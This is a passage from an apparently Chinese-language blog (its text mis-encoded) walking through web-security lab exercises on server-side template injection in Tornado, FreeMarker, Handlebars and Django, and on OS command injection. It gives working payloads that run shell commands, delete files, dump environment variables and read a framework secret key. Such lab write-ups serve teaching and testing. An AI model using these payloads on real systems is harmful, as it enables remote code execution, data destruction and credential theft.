%&gt;</code>ï¼Œåˆ é™¤moral.txtæ–‡ä»¶</p><p><img src="/sake-s-blog/assets/image-20230121205034621-CpoIIviE.png" alt="image-20230121205034621"></p><h2 id="basic-server-side-template-injection-code-context" tabindex="-1"><a class="header-anchor" href="#basic-server-side-template-injection-code-context"><span>Basic server-side template injection (code context)</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>ç”±äºä½¿ç”¨Tornadoæ¨¡æ¿çš„æ–¹å¼ä¸å®‰å…¨ï¼Œè¯¥å®éªŒå®¤å®¹æ˜“å—åˆ°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥çš„å½±å“ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¯·æŸ¥çœ‹Tornadoæ–‡æ¡£ï¼Œäº†è§£å¦‚ä½•æ‰§è¡Œä»»æ„ä»£ç ï¼Œç„¶åä»Carlosçš„ä¸»ç›®å½•ä¸­åˆ é™¤morale.txtæ–‡ä»¶ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•åˆ°è‡ªå·±çš„å¸æˆ·ï¼šwiener:peter</p></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>ç™»å½•ç”¨æˆ·ï¼Œç„¶åæŠ“å–æäº¤<strong>Preferred name</strong>çš„æ•°æ®åŒ…ï¼Œå‘ç°æ˜¯é€šè¿‡ä¸€ä¸ªPOSTè¯·æ±‚è®¾ç½®<code>blog-post-author-display</code>å­—æ®µçš„å‚æ•°ï¼Œå–å€¼ä¸ºï¼š<code>user.name</code>ï¼Œ<code>user.first_name</code>æˆ–<code>user.nickname</code></p><p><img src="/sake-s-blog/assets/image-20230121212356539-DRoybu6B.png" alt="image-20230121212356539"></p><p><img src="/sake-s-blog/assets/image-20230121212310205-DzCJyFXc.png" alt="image-20230121212310205"></p><p>é€šè¿‡é˜…è¯»Tornadoæ–‡æ¡£ä¸­<a href="https://tornado-zh.readthedocs.io/zh/latest/template.html#" target="_blank" rel="noopener noreferrer">template<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>çš„ç”¨æ³•ï¼Œæˆ‘ä»¬äº†è§£åˆ°æ¨¡æ¿è¡¨è¾¾å¼è¢«åŒèŠ±æ‹¬å·åŒ…å›´: <code>{{ python expression }}</code>ï¼Œç„¶åè½¬ä¹‰å¹¶ä¸”æ’å…¥åˆ°è¾“å‡º</p><p><img src="/sake-s-blog/assets/image-20230121213025258-dIoZSAgL.png" alt="image-20230121213025258"></p><p><img src="/sake-s-blog/assets/image-20230121213314589-xjDt0hOq.png" alt="image-20230121213314589"></p><p>äºæ˜¯æˆ‘ä»¬å°†<code>blog-post-author-display=user.name</code>ä¿®æ”¹ä¸º<code>blog-post-author-display=user.name}}{{7*7</code>ï¼Œå†æ‰“å¼€éšä¾¿ä¸€ç¯‡æ–‡ç« ï¼Œåœ¨æ–‡ç« è¯„è®ºåŒºè¯„è®ºï¼Œå°†æ˜µç§°å›æ˜¾å‡ºæ¥ã€‚å‘ç°é¡µé¢è¿”å›äº†49ï¼Œç¡®å®å­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><p><img src="/sake-s-blog/assets/image-20230121214406213-U7seVLt3.png" alt="image-20230121214406213"></p><p>æ¥ç€æˆ‘ä»¬åˆ©ç”¨åŒèŠ±æ‹¬å·åŒ…å›´çš„pythonè¡¨è¾¾å¼æ„å»ºshellå‘½ä»¤ï¼ˆè¯¦ç»†è§ä¸Šæ–‡æåˆ°çš„<a href="https://tornado-zh.readthedocs.io/zh/latest/template.html#id1" target="_blank" rel="noopener noreferrer">è¯­æ³•å‚è€ƒ<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ï¼‰ï¼Œå°†<code>blog-post-author-display=user.name</code>æ”¹ä¸º<code>blog-post-author-display=user.name}}{{__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()</code>ï¼Œå†æ¬¡æŸ¥çœ‹è¯„è®ºåŒºå›æ˜¾</p><p><img src="/sake-s-blog/assets/image-20230121215425444-DFkBIIU5.png" alt="image-20230121215425444"></p><p>æœ€åæ‰§è¡Œåˆ é™¤moral.txtæ–‡ä»¶çš„å‘½ä»¤ï¼ˆä¿®æ”¹ä¸º<code>blog-post-author-display=user.name}}{{__import__(&quot;os&quot;).popen(&quot;rm morale.txt&quot;).read()</code>ï¼‰å°±æˆåŠŸè§£å†³äº†Lab</p><p><img src="/sake-s-blog/assets/image-20230121215722468-DwuhaSLP.png" alt="image-20230121215722468"></p><h2 id="server-side-template-injection-using-documentation" tabindex="-1"><a class="header-anchor" href="#server-side-template-injection-using-documentation"><span>Server-side template injection using documentation</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>æ­¤å®éªŒå®¤æ˜“å—æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥çš„å½±å“ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¯·ç¡®å®šæ¨¡æ¿å¼•æ“å¹¶ä½¿ç”¨æ–‡æ¡£æ¥ç¡®å®šå¦‚ä½•æ‰§è¡Œä»»æ„ä»£ç ï¼Œç„¶åä»Carlosçš„ä¸»ç›®å½•ä¸­åˆ é™¤morale.txtæ–‡ä»¶ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•åˆ°è‡ªå·±çš„å¸æˆ·ï¼š<code>content-manager:C0nt3ntM4n4g3r</code></p></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>ç™»å½•ç”¨æˆ·ï¼Œç¼–è¾‘æ¨¡æ¿ï¼Œç›´æ¥ç»™äº†æ¨¡æ¿æ³¨å…¥çš„ä¸€ä¸ªæµ‹è¯•é¡µé¢ï¼Œè¿˜æ”¯æŒé¢„è§ˆ</p><p><img src="/sake-s-blog/assets/image-20230121221153611-BBhC7zHW.png" alt="image-20230121221153611"></p><p>é€šè¿‡æŸ¥é˜…freemarkerçš„æ–‡æ¡£ï¼Œå‘ç°æœ‰å¯¹<a href="http://freemarker.foofun.cn/app_faq.html#faq_template_uploading_security" target="_blank" rel="noopener noreferrer">æ¨¡æ¿çš„ä¸Šä¼ å®‰å…¨æ€§<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>è¿›è¡Œè¯´æ˜ï¼Œæåˆ°äº†<strong>è™½ç„¶newä¸ä¼šå®ä¾‹åŒ–ä¸æ˜¯TemplateModel-sçš„ç±»ï¼Œä½†FreeMarkeråŒ…å«ä¸€ä¸ªTemplateModelç±»ï¼Œå¯ç”¨äºåˆ›å»ºä»»æ„Javaå¯¹è±¡</strong>ã€‚</p><p><img src="/sake-s-blog/assets/image-20230121221028401-BkymRurF.png" alt="image-20230121221028401"></p><p>æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å¯¹<a href="http://freemarker.foofun.cn/ref_builtins_expert.html#ref_builtin_new" target="_blank" rel="noopener noreferrer">newå‡½æ•°<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>çš„æè¿°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>freemarker.template.utility</strong>çš„<strong>Execute</strong>ç±»æ¥æ‰§è¡Œshellå‘½ä»¤</p><p><img src="/sake-s-blog/assets/image-20230121221556207-C9DDmCtL.png" alt="image-20230121221556207"></p><p><code>&lt;#assign test=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${test(&quot;ls&quot;)}</code></p><p><img src="/sake-s-blog/assets/image-20230121222227366-8ebn37h4.png" alt="image-20230121222227366"></p><p><code>&lt;#assign test=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${test(&quot;ls&quot;)}</code></p><p><img src="/sake-s-blog/assets/image-20230121222440470-BpRGEwQa.png" alt="image-20230121222440470"></p><h2 id="server-side-template-injection-in-an-unknown-language-with-a-documented-exploit" tabindex="-1"><a class="header-anchor" href="#server-side-template-injection-in-an-unknown-language-with-a-documented-exploit"><span>Server-side template injection in an unknown language with a documented exploit</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>æ­¤å®éªŒå®¤æ˜“å—æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥çš„å½±å“ã€‚è¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·è¯†åˆ«æ¨¡æ¿å¼•æ“å¹¶åœ¨çº¿æŸ¥æ‰¾å¯ç”¨äºæ‰§è¡Œä»»æ„ä»£ç çš„æ¼æ´ï¼Œç„¶åä»Carlosçš„ä¸»ç›®å½•ä¸­åˆ é™¤morale.txtæ–‡ä»¶ã€‚</p></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>éšä¾¿ç‚¹å‡»ä¸€ä¸ªå•†å“è¯¦ç»†ï¼Œè¯·æ±‚çš„messageå¯æ§ï¼Œä¸”èƒ½å›æ˜¾åˆ°é¡µé¢ä¸Šï¼Œç›®æ ‡æ³¨å…¥ç‚¹å°±åœ¨è¿™é‡Œï¼Œå°è¯•æäº¤<code>${{&lt;%[%&#39;&quot;}}%\</code>fuzzæµ‹è¯•ä¸€ä¸‹ï¼Œå›æ˜¾æŠ¥é”™æ˜¾ç¤ºä½¿ç”¨çš„æ˜¯<strong>handlebars</strong></p><p><img src="/sake-s-blog/assets/image-20230121223137509-9atsbxFD.png" alt="image-20230121223137509"></p><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€ä»½<a href="https://xz.aliyun.com/t/4695" target="_blank" rel="noopener noreferrer">POC<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ï¼š</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line"><span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token string">&quot;s&quot;</span> <span class="token keyword">as</span> <span class="token operator">|</span>string<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">  <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token string">&quot;e&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> split <span class="token keyword">as</span> <span class="token operator">|</span>conslist<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">push</span> <span class="token punctuation">(</span>lookup string<span class="token punctuation">.</span>sub <span class="token string">&quot;constructor&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> string<span class="token punctuation">.</span>split <span class="token keyword">as</span> <span class="token operator">|</span>codelist<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>push <span class="token string">&quot;return JSON.stringify(process.env);&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span>#each conslist<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">          <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>sub<span class="token punctuation">.</span>apply <span class="token number">0</span> codelist<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">            <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">          <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span>each<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">  <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ç¨åŠ ä¿®æ”¹ï¼Œç„¶åå†urlencodeä¹‹åè¯·æ±‚ä¸€ä¸‹å°±æˆåŠŸåˆ é™¤morale.txt</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line"><span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token string">&quot;s&quot;</span> <span class="token keyword">as</span> <span class="token operator">|</span>string<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">  <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token string">&quot;e&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> split <span class="token keyword">as</span> <span class="token operator">|</span>conslist<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">push</span> <span class="token punctuation">(</span>lookup string<span class="token punctuation">.</span>sub <span class="token string">&quot;constructor&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> string<span class="token punctuation">.</span>split <span class="token keyword">as</span> <span class="token operator">|</span>codelist<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>push <span class="token string">&quot;return require(&#39;child_process&#39;).exec(&#39;rm /home/carlos/morale.txt&#39;);&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span>#each conslist<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">          <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>sub<span class="token punctuation">.</span>apply <span class="token number">0</span> codelist<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">            <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">          <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span>each<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">  <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="/sake-s-blog/assets/image-20230121224629671-BCpd_rg5.png" alt="image-20230121224629671"></p><h2 id="server-side-template-injection-with-information-disclosure-via-user-supplied-objects" tabindex="-1"><a class="header-anchor" href="#server-side-template-injection-with-information-disclosure-via-user-supplied-objects"><span>Server-side template injection with information disclosure via user-supplied objects</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>ç”±äºå¯¹è±¡ä¼ é€’åˆ°æ¨¡æ¿ä¸­çš„æ–¹å¼ï¼Œæ­¤å®éªŒå®¤å®¹æ˜“å—åˆ°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥çš„å½±å“ã€‚å¯åˆ©ç”¨æ­¤æ¼æ´è®¿é—®æ•æ„Ÿæ•°æ®ã€‚ è¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·çªƒå–å¹¶æäº¤æ¡†æ¶çš„å¯†é’¥ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•åˆ°è‡ªå·±çš„å¸æˆ·ï¼š<code>content-manager:C0nt3ntM4n4g3r</code></p></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>ç™»å½•ç”¨æˆ·ï¼Œç¼–è¾‘æ¨¡æ¿ï¼Œç›´æ¥ç»™äº†æ¨¡æ¿æ³¨å…¥çš„ä¸€ä¸ªæµ‹è¯•é¡µé¢ï¼Œè¿˜æ”¯æŒé¢„è§ˆï¼Œå°è¯•æäº¤<code>${{&lt;%[%&#39;&quot;}}%\</code>fuzzæµ‹è¯•ä¸€ä¸‹ï¼Œå›æ˜¾æŠ¥é”™æ˜¾ç¤ºä½¿ç”¨çš„æ˜¯<strong>django</strong></p><p><img src="/sake-s-blog/assets/image-20230121225512454-CwSFI_kW.png" alt="image-20230121225512454"></p><p>å­¦ä¹ <a href="https://docs.djangoproject.com/zh-hans/4.1/" target="_blank" rel="noopener noreferrer">Djangoæ–‡æ¡£<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ï¼Œè°ƒç”¨debugå†…ç½®å‡½æ•°ï¼š<code>{% debug %}</code>ï¼Œè¿”å›æ­¤æ¨¡æ¿å†…è®¿é—®çš„å¯¹è±¡å’Œå±æ€§çš„åˆ—è¡¨</p><p><img src="/sake-s-blog/assets/image-20230121230125056-CVOiJlMq.png" alt="image-20230121230125056"></p><p>ç ”ç©¶å®˜æ–¹æ–‡æ¡£ä¸­å…³äº<a href="https://docs.djangoproject.com/zh-hans/4.1/ref/settings" target="_blank" rel="noopener noreferrer">settings<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>çš„æè¿°ï¼Œå…¶ä¸­å«æœ‰çš„SECRET_KEYå±æ€§æ­£æ˜¯æˆ‘ä»¬è¦çªƒå–çš„å¯†é’¥</p><p><img src="/sake-s-blog/assets/image-20230121231014081-BDflQVB_.png" alt="image-20230121231014081"></p><p>ç›´æ¥ç”¨<code>{{settings.SECRET_KEY}}</code>è¯»å‡ºsecret_keyçš„å€¼ï¼Œæäº¤å¯†é’¥å³å¯</p><p><img src="/sake-s-blog/assets/image-20230121231332991-BofGOD8-.png" alt="image-20230121231332991"></p><h2 id="-2" tabindex="-1"><a class="header-anchor" href="#-2"><span>------------------------------</span></a></h2><h1 id="å‘½ä»¤æ³¨å…¥" tabindex="-1"><a class="header-anchor" href="#å‘½ä»¤æ³¨å…¥"><span><strong>å‘½ä»¤æ³¨å…¥</strong></span></a></h1><p><img src="/sake-s-blog/assets/image-20230107220209776-o-G-jOcl.png" alt="image-20230107220209776"></p><blockquote><p>OSå‘½ä»¤æ³¨å…¥ï¼ˆä¹Ÿç§°ä¸ºshellæ³¨å…¥ï¼‰æ˜¯ä¸€ç§webå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰å‘½ä»¤ï¼Œé€šå¸¸ä¼šå®Œå…¨ç ´ååº”ç”¨ç¨‹åºåŠå…¶æ‰€æœ‰æ•°æ®ã€‚é€šå¸¸ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨OSå‘½ä»¤æ³¨å…¥æ¼æ´æ¥å±å®³æ‰˜ç®¡åŸºç¡€è®¾æ–½çš„å…¶ä»–éƒ¨åˆ†ï¼Œåˆ©ç”¨ä¿¡ä»»å…³ç³»å°†æ”»å‡»è½¬ç§»åˆ°ç»„ç»‡å†…çš„å…¶ä»–ç³»ç»Ÿã€‚</p></blockquote><h2 id="ç®€å•æ¡ˆä¾‹1" tabindex="-1"><a class="header-anchor" href="#ç®€å•æ¡ˆä¾‹1"><span>ç®€å•æ¡ˆä¾‹1</span></a></h2><blockquote><p><strong>ç›®æ ‡æ˜¯è·å¾—ç³»ç»Ÿç”¨æˆ·å</strong></p></blockquote><blockquote><p><strong>ä¸€äº›æœ‰ç”¨çš„å‘½ä»¤</strong></p><p>å½“æ‚¨å·²ç»ç¡®å®šäº†ä¸€ä¸ªæ“ä½œç³»ç»Ÿå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå®ƒé€šå¸¸ç”¨æ¥æ‰§è¡Œä¸€äº›åˆæ­¥å‘½ä»¤ï¼Œä»¥è·å–æœ‰å…³ç³»ç»Ÿçš„ä¿¡æ¯ã€‚åœ¨Linuxå’ŒWindows:</p><table><thead><tr><th>ç›®çš„å‘½ä»¤</th><th>Linux</th><th>Windows</th></tr></thead><tbody><tr><td>å½“å‰ç”¨æˆ·å</td><td><code> whoami </code></td><td><code> whoami </code></td></tr><tr><td>æ“ä½œç³»ç»Ÿ</td><td><code> uname -a </code></td><td><code> ver </code></td></tr><tr><td>ç½‘ç»œé…ç½®</td><td><code> ifconfig </code></td><td><code> ipconfig /all </code></td></tr><tr><td>ç½‘ç»œçš„è¿æ¥</td><td><code> netstat -an </code></td><td><code> netstat -an </code></td></tr><tr><td>æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</td><td><code> ps -ef </code></td><td><code> tasklist </code></td></tr></tbody></table></blockquote><p>æ³¨å…¥ç‚¹åœ¨ç‚¹å‡»<code>Check stock</code>æ‰€å‘æ•°æ®åŒ…ä¸­</p><p><img src="/sake-s-blog/assets/image-20230107221854254-k5k9YwhJ.png" alt="image-20230107221854254"></p><p>æŠ“åŒ…å°†<code>storeId=1</code>æ”¹ä¸º<code>storeId=1|whoami</code>ï¼ŒæˆåŠŸè·å¾—å½“å‰ç”¨æˆ·åï¼Œè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20230107222019669-BHvnBoC3.png" alt="image-20230107222019669"></p><h2 id="åŸºäºæ—¶é—´çš„å‘½ä»¤ç›²æ³¨" tabindex="-1"><a class="header-anchor" href="#åŸºäºæ—¶é—´çš„å‘½ä»¤ç›²æ³¨"><span>åŸºäºæ—¶é—´çš„å‘½ä»¤ç›²æ³¨</span></a></h2><blockquote><p><strong>ç›®æ 